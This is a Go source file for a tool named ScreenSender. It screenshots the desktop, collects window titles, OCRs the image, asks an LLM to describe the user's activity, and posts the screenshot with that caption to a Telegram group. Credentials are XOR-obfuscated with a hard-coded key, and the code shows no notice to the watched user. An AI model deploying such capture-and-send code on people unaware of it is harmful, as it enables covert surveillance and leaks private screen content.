// Файл: main.go (ФИНАЛЬНАЯ ВЕРСИЯ С УЛУЧШЕННЫМ ПРОМПТОМ)
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"image/jpeg"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// --- Глобальные переменные для ldflags ---
var (
	encryptedToken                string
	encryptedScreenshotTargetInfo string
	encryptedLogTargetInfo        string
	encryptedNavyAIKeys           string
	encryptedElectronHubKeys      string
	encryptedVoidAIKeys           string
	encryptedOcrKeys              string
)

// --- Константы ---
const encryptionKey = "a-very-secret-key-for-my-app-123"
const (
	MODEL_PRIMARY     = "gpt-4o"
	MODEL_BACKUP      = "gemini-1.5-flash-latest"
	MODEL_LAST_RESORT = "gpt-3.5-turbo"
)
const ocrWordLimit = 25

// --- Структуры ---
type ResponseFormat struct {
	Type string `json:"type"`
}
type APIRequest struct {
	Model          string          `json:"model"`
	Messages       []Message       `json:"messages"`
	MaxTokens      int             `json:"max_tokens"`
	Temperature    float32         `json:"temperature"`
	ResponseFormat *ResponseFormat `json:"response_format,omitempty"`
}
type Message struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}
type APIResponse struct{ Choices []Choice }
type Choice struct{ Message Message }

type AI_Batch_Output struct {
	PrimaryProgram       string `json:"primary_program"`
	UserActivitySentence string `json:"user_activity_sentence"`
	ActivityCategory     string `json:"activity_category"`
}
type Provider struct {
	Name, APIEndpoint, ModelName string
	Keys                         []string
	Priority                     int
}
type OcrResponse struct {
	ParsedResults         []ParsedResult `json:"ParsedResults"`
	OCRExitCode           int            `json:"OCRExitCode"`
	IsErroredOnProcessing bool           `json:"IsErroredOnProcessing"`
	ErrorMessage          string         `json:"ErrorMessage"`
}
type ParsedResult struct {
	ParsedText   string `json:"ParsedText"`
	ErrorMessage string `json:"ErrorMessage"`
	ErrorDetails string `json:"ErrorDetails"`
}

// --- Функции-обертки для платформо-зависимого кода ---
func getScreenshot() ([]byte, error) {
	img, err := captureScreen()
	if err != nil {
		return nil, err
	}
	var buf bytes.Buffer
	err = jpeg.Encode(&buf, img, nil)
	if err != nil {
		return nil, fmt.Errorf("ошибка кодирования в JPEG: %v", err)
	}
	return buf.Bytes(), nil
}
func getWindowTitles() ([]string, error) {
	return getAllVisibleWindowTitles()
}

// --- Логика распознавания текста ---
func getTextFromImage(imageData []byte, ocrApiKeys []string, logFunc func(string)) (string, error) {
	if len(ocrApiKeys) == 0 || (len(ocrApiKeys) == 1 && ocrApiKeys[0] == "") {
		return "", fmt.Errorf("API ключ для OCR не предоставлен")
	}
	url := "https://api.ocr.space/parse/image"
	var lastError error
	for _, apiKey := range ocrApiKeys {
		var requestBody bytes.Buffer
		writer := multipart.NewWriter(&requestBody)
		part, err := writer.CreateFormFile("file", "screenshot.jpg")
		if err != nil {
			lastError = err
			continue
		}
		_, err = io.Copy(part, bytes.NewReader(imageData))
		if err != nil {
			lastError = err
			continue
		}
		writer.WriteField("apikey", apiKey)
		writer.WriteField("language", "rus")
		writer.WriteField("scale", "true")
		writer.Close()
		req, err := http.NewRequest("POST", url, &requestBody)
		if err != nil {
			lastError = err
			continue
		}
		req.Header.Set("Content-Type", writer.FormDataContentType())
		client := &http.Client{Timeout: 45 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			lastError = err
			continue
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			bodyBytes, _ := io.ReadAll(resp.Body)
			lastError = fmt.Errorf("OCR.space API вернул ошибку: %s (тело: %s)", resp.Status, string(bodyBytes))
			continue
		}
		var ocrResponse OcrResponse
		if err := json.NewDecoder(resp.Body).Decode(&ocrResponse); err != nil {
			lastError = err
			continue
		}
		if ocrResponse.IsErroredOnProcessing {
			lastError = fmt.Errorf("ошибка обработки в OCR.space: %s", ocrResponse.ErrorMessage)
			continue
		}
		if len(ocrResponse.ParsedResults) > 0 && ocrResponse.ParsedResults[0].ParsedText != "" {
			return ocrResponse.ParsedResults[0].ParsedText, nil
		}
	}
	logFunc(fmt.Sprintf("⚠️ OCR: Не удалось получить текст с изображения: %v", lastError))
	return "", lastError
}

// --- Логика анализа AI с 3 попытками и JSON MODE ---
func analyzeContent(titles []string, truncatedOcrText string, providers []Provider, logFunc func(string)) (*AI_Batch_Output, error) {
	// <<< --- УЛУЧШЕННЫЙ ПРОМПТ ДЛЯ МНОГОЗАДАЧНОСТИ --- >>>
	prompt := fmt.Sprintf(`
ТЫ — ЭКСПЕРТ-АНАЛИТИК. Твоя цель — точно определить деятельность пользователя, особенно многозадачность.

ПРАВИЛА:
1.  ПРИОРИТЕТ: Текст с экрана (OCR) важнее заголовков.
2.  МНОГОЗАДАЧНОСТЬ: Если видишь одновременно игру (например, Hearthstone, Steam) И программу для общения (Meet, Discord, Telegram, Zoom, Skype), ОБЪЕДИНИ их в описании.
    - Пример: "Играет в Hearthstone и общается в Meet".
3.  КАТЕГОРИЗАЦИЯ: Если есть игра, категория всегда "Гейминг".

ЗАДАНИЕ: Верни JSON-объект с 3 ключами:
- "primary_program": (string) Название самой активной программы (игра в приоритете).
- "user_activity_sentence": (string) Описание задачи (примерно 5-10 слов на русском).
- "activity_category": (string) Категория: Разработка, Коммуникация, Дизайн, Веб-серфинг, Гейминг, Офисная работа, Мультимедиа, Системные задачи.

ДАННЫЕ ДЛЯ АНАЛИЗА:
1. Заголовки окон:
%s
2. Текст с экрана (до %d слов):
%s`, strings.Join(titles, "\n"), ocrWordLimit, truncatedOcrText)
	// <<< --- КОНЕЦ НОВОГО ПРОМПТА --- >>>

	logFunc(fmt.Sprintf("---\nДанные для AI:\nЗаголовки:\n%s\n\nТекст с OCR (урезанный):\n%s\n---", strings.Join(titles, "\n"), truncatedOcrText))

	var bestResult *AI_Batch_Output
	var bestResultPriority int = 99
	var lastError error

	const totalAttempts = 3
	for attempt := 1; attempt <= totalAttempts; attempt++ {
		logFunc(fmt.Sprintf("--- НАЧАЛО ПОПЫТКИ %d из %d ---", attempt, totalAttempts))
		for _, provider := range providers {
			if bestResult != nil && provider.Priority >= bestResultPriority {
				continue
			}
			logFunc(fmt.Sprintf("▶️ Проверяю провайдера: %s", provider.Name))

			if len(provider.Keys) == 0 || (len(provider.Keys) == 1 && provider.Keys[0] == "") {
				logFunc(fmt.Sprintf("🟡 %s: Пропущено, ключи не предоставлены.", provider.Name))
				continue
			}
			for _, key := range provider.Keys {
				payload := APIRequest{
					Model:          provider.ModelName,
					Messages:       []Message{{Role: "user", Content: prompt}},
					MaxTokens:      150,
					Temperature:    0.2,
					ResponseFormat: &ResponseFormat{Type: "json_object"},
				}
				requestBodyBytes, _ := json.Marshal(payload)
				req, _ := http.NewRequest("POST", provider.APIEndpoint, bytes.NewBuffer(requestBodyBytes))
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", "Bearer "+key)
				client := &http.Client{Timeout: 30 * time.Second}
				resp, err := client.Do(req)
				if err != nil {
					lastError = err
					logFunc(fmt.Sprintf("⚠️ %s: Ошибка сети.", provider.Name))
					break
				}
				if resp.StatusCode >= 400 {
					lastError = fmt.Errorf("статус %d", resp.StatusCode)
					logFunc(fmt.Sprintf("⚠️ %s (Статус: %d): Ключ/запрос невалиден.", provider.Name, resp.StatusCode))
					resp.Body.Close()
					continue
				}
				bodyBytes, err := io.ReadAll(resp.Body)
				if err != nil {
					lastError = err
					logFunc(fmt.Sprintf("⚠️ %s: Не удалось прочитать ответ.", provider.Name))
					resp.Body.Close()
					break
				}
				resp.Body.Close()
				logFunc(fmt.Sprintf("RAW ответ от AI (%s):\n```json\n%s\n```", provider.Name, string(bodyBytes)))

				var apiResponse APIResponse
				if err := json.Unmarshal(bodyBytes, &apiResponse); err != nil {
					lastError = err
					logFunc(fmt.Sprintf("⚠️ %s: Не удалось распарсить внешнюю структуру.", provider.Name))
					break
				}
				if len(apiResponse.Choices) == 0 || apiResponse.Choices[0].Message.Content == "" {
					lastError = fmt.Errorf("пустой content")
					logFunc(fmt.Sprintf("⚠️ %s: Пустой ответ.", provider.Name))
					break
				}

				aiContentString := apiResponse.Choices[0].Message.Content
				var finalOutput AI_Batch_Output
				if err = json.Unmarshal([]byte(aiContentString), &finalOutput); err != nil {
					lastError = err
					logFunc(fmt.Sprintf("⚠️ %s: Не удалось распарсить JSON из 'content'.", provider.Name))
					break
				}

				logFunc(fmt.Sprintf("✅ Успешно! Промежуточный результат получен от %s.", provider.Name))
				bestResult = &finalOutput
				bestResultPriority = provider.Priority
				goto nextProvider
			}
		nextProvider:
		}
		if bestResult != nil && bestResultPriority == 0 {
			logFunc("🏆 Получен результат от приоритетного провайдера NavyAI. Завершаем попытки.")
			break
		}
		if attempt < totalAttempts {
			logFunc(fmt.Sprintf("--- КОНЕЦ ПОПЫТКИ %d. Пауза 30 секунд. ---", attempt))
			time.Sleep(30 * time.Second)
		}
	}
	if bestResult != nil {
		return bestResult, nil
	}
	logFunc("❌ Все 3 попытки провалились. Не удалось получить анализ.")
	return nil, lastError
}

// --- Вспомогательные функции ---
func truncateTextByWords(text string, limit int) string {
	words := strings.Fields(text)
	if len(words) <= limit {
		return text
	}
	return strings.Join(words[:limit], " ")
}
func xorCipher(data []byte, key string) []byte {
	keyBytes := []byte(key)
	keyLen := len(keyBytes)
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ keyBytes[i%keyLen]
	}
	return result
}

// --- Логика отправки в Telegram ---
func sendLog(botToken, logTargetInfo, errorMessage string) {
	if botToken == "" || logTargetInfo == "" {
		return
	}
	parts := strings.Split(logTargetInfo, ":")
	if len(parts) != 2 {
		return
	}
	groupID, errGroup := strconv.ParseInt(parts[0], 10, 64)
	topicID, errTopic := strconv.Atoi(parts[1])
	if errGroup != nil || errTopic != nil {
		return
	}
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		return
	}
	fullMessage := fmt.Sprintf("📝 Лог ScreenSender:\n\n%s", errorMessage)
	msg := tgbotapi.NewMessage(groupID, fullMessage)
	msg.ReplyToMessageID = topicID
	bot.Send(msg)
}
func processAndSendScreenshot(photoData []byte, windowTitles []string, botToken, screenshotTargetInfo string, providers []Provider, ocrKeys []string, logFunc func(string)) {
	if botToken == "" || screenshotTargetInfo == "" {
		logFunc("Токен или ID для скриншотов пустые.")
		return
	}
	ocrText, _ := getTextFromImage(photoData, ocrKeys, logFunc)
	truncatedOcrText := truncateTextByWords(ocrText, ocrWordLimit)
	analysisResult, err := analyzeContent(windowTitles, truncatedOcrText, providers, logFunc)
	var caption string
	if err != nil || analysisResult == nil {
		caption = "Активность не определена"
	} else {
		caption = analysisResult.UserActivitySentence
	}
	parts := strings.Split(screenshotTargetInfo, ":")
	if len(parts) != 2 {
		logFunc(fmt.Sprintf("Неверный формат ID для скриншотов: %s", screenshotTargetInfo))
		return
	}
	groupID, errGroup := strconv.ParseInt(parts[0], 10, 64)
	topicID, errTopic := strconv.Atoi(parts[1])
	if errGroup != nil || errTopic != nil {
		logFunc("Не удалось распарсить ID для скриншотов.")
		return
	}
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		logFunc(fmt.Sprintf("Ошибка инициализации бота: %v", err))
		return
	}
	file := tgbotapi.FileBytes{Name: "screenshot.jpg", Bytes: photoData}
	msg := tgbotapi.NewPhoto(groupID, file)
	msg.Caption = caption
	msg.ReplyToMessageID = topicID
	if _, err := bot.Send(msg); err != nil {
		logFunc(fmt.Sprintf("Ошибка отправки скриншота: %v", err))
	}
}

// --- Главная функция (ЗАПУСК ОДИН РАЗ С ПОПЫТКАМИ) ---
func main() {
	encryptFlag := flag.String("encrypt", "", "Encrypt a string and print it to stdout")
	flag.Parse()
	if *encryptFlag != "" {
		data := []byte(*encryptFlag)
		encrypted := xorCipher(data, encryptionKey)
		fmt.Print(base64.StdEncoding.EncodeToString(encrypted))
		return
	}

	tokenDecoded, _ := base64.StdEncoding.DecodeString(encryptedToken)
	decryptedToken := string(xorCipher(tokenDecoded, encryptionKey))
	screenshotTargetDecoded, _ := base64.StdEncoding.DecodeString(encryptedScreenshotTargetInfo)
	decryptedScreenshotTarget := string(xorCipher(screenshotTargetDecoded, encryptionKey))
	logTargetDecoded, _ := base64.StdEncoding.DecodeString(encryptedLogTargetInfo)
	decryptedLogTarget := string(xorCipher(logTargetDecoded, encryptionKey))
	ocrKeysDecoded, _ := base64.StdEncoding.DecodeString(encryptedOcrKeys)
	ocrKeysDecrypted := string(xorCipher(ocrKeysDecoded, encryptionKey))
	ocrApiKeys := strings.Split(ocrKeysDecrypted, ",")

	decryptAndSplit := func(encrypted string) []string {
		if encrypted == "" {
			return []string{}
		}
		decoded, err := base64.StdEncoding.DecodeString(encrypted)
		if err != nil {
			return []string{}
		}
		decrypted := string(xorCipher(decoded, encryptionKey))
		if decrypted == "" {
			return []string{}
		}
		return strings.Split(decrypted, ",")
	}
	providers := []Provider{
		{Name: "NavyAI (Primary)", APIEndpoint: "https://api.navy/v1/chat/completions", Keys: decryptAndSplit(encryptedNavyAIKeys), ModelName: MODEL_PRIMARY, Priority: 0},
		{Name: "ElectronHub (Backup)", APIEndpoint: "https://api.electronhub.ai/v1/chat/completions", Keys: decryptAndSplit(encryptedElectronHubKeys), ModelName: MODEL_BACKUP, Priority: 1},
		{Name: "VoidAI (Last Resort)", APIEndpoint: "https://api.voidai.app/v1/chat/completions", Keys: decryptAndSplit(encryptedVoidAIKeys), ModelName: MODEL_LAST_RESORT, Priority: 2},
	}

	logAndSend := func(errMsg string) {
		log.Println(errMsg)
		sendLog(decryptedToken, decryptedLogTarget, errMsg)
	}

	logAndSend("🚀 ScreenSender запущен (режим 3 попыток, JSON Mode).")
	screenshotBytes, err := getScreenshot()
	if err != nil {
		logAndSend(fmt.Sprintf("Не удалось сделать скриншот: %v", err))
		return
	}
	titles, err := getWindowTitles()
	if err != nil {
		logAndSend(fmt.Sprintf("Не удалось получить заголовки окон: %v", err))
		titles = []string{}
	}

	processAndSendScreenshot(screenshotBytes, titles, decryptedToken, decryptedScreenshotTarget, providers, ocrApiKeys, logAndSend)

	logAndSend("✅ Задача выполнена. Программа завершает работу.")
}
